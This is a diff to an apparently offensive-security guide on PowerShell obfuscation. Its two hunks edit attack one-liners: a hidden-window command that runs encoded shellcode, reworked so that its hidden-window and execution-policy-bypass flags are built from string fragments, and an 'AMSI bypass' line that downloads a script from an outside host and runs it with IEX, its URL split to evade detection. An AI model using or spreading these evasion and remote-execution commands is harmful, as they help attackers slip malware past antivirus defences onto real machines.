@@ -621,9 +621,9 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
 - File **Unicorn.ps1** (base64 shellcode execution)
 
-      powershell -WiN hIdDEn -C "set-variable -name "C" -value "-"; set-variable -name "s" -value "e"; set-variable -name "q" -value "c"; set-variable -name "P" -value ((get-variable C).value.toString()+(get-variable s).value.toString()+(get-variable q).value.toString()) ; powershell (get-variable P).value.toString() ENCODED-BASE64-SHELLCODE"
+      $syscall=("{1}{0}" -f'N','-Wi'); $flag=("{1}{0}{2}" -f'Id','h','DEn'); $cert=("{1}{0}" -f'p','-E'); $pem=("{1}{2}{0}" -f'SS','by','pA'); powershell $syscall $flag $cert $pem -C "set-variable -name "C" -value "-"; set-variable -name "s" -value "e"; set-variable -name "q" -value "c"; set-variable -name "P" -value ((get-variable C).value.toString()+(get-variable s).value.toString()+(get-variable q).value.toString()) ; powershell (get-variable P).value.toString() ENCODED-BASE64-SHELLCODE"; exit
 
-![powershell obfuscation](http://i.cubeupload.com/VM5rc9.png)
+![powershell obfuscation](http://i.cubeupload.com/CzJJc0.png)
 
 ---
 
@@ -776,7 +776,7 @@ Here we can view the all process of encoding/decoding in powershell console
 
 - Oneliner AMSI bypass<br />
 
-      powershell.exe -version 2; IEX (New-Object Net.WebClient).DownloadString('ht'+'tp:'+'//19'+'2.16'+'8.1.71/Hello.ps1')
+      powershell.exe -version 2 IEX (New-Object Net.WebClient).DownloadString('ht'+'tp:'+'//19'+'2.16'+'8.1.71/Hello.ps1')
       
 
 ![AMSI Bypass](http://i.cubeupload.com/96RKEi.jpg)
